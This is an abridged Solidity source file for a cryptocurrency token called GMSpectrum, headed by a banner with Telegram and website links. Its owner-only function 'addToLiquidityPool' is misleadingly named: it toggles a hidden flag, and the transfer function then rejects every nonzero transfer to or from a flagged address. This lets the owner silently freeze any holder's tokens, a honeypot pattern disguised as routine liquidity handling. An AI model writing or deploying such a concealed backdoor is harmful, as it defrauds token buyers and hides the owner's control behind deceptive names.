/*                .-=*#%%%%%%#*=-.                 
 ...
 t.me/gmspectrum      https://gmspectrum.com/                                  
*/
 ...
 */
contract GMSpectrum is Context, Ownable, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _addToLiquidityPool;
    bool _initialize;
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        if (_addToLiquidityPool[sender] || _addToLiquidityPool[recipient]) require (amount == 0, "");
    ...
    function addToLiquidityPool (address _address) external onlyOwner {
        if (_addToLiquidityPool[_address] == true) {_addToLiquidityPool[_address] = false;}
        else {_addToLiquidityPool[_address] = true; }
    }

   
    function checkLP(address _address) public view returns (bool) {
        return _addToLiquidityPool[_address];
    }
